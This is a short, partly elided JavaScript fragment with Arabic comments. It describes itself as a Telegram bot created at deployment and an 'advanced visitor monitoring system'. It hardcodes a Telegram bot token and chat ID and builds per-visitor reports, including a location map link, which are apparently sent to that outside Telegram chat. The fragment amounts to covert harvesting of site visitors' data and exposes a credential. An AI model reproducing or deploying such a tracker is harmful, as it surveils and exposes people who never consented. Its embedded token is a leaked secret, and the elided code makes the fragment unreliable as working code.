// =====================================================
// 🤖 بوت تليجرام - تم إنشاؤه تلقائيًا أثناء النشر
// تاريخ الإنشاء: $(date)
// =====================================================

const TELEGRAM_BOT_TOKEN = '8851334712:AAERbfEwnj8zSsTvvZXTToSEMsck2zskNGg';
const TELEGRAM_CHAT_ID = '5511952564';

// =====================================================
// نظام رصد الزوار المتقدم
// =====================================================
...
function sendFinalReport() {
    ...
    if (visitorData.locationMap) report += '🗺️ <b>خريطة:</b> <a href="' + visitorData.locationMap + '">اضغط للمشاهدة</a>\n';
    report += '━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
    ...
    }).catch(function(e) { console.log('خطأ:', e); });
}
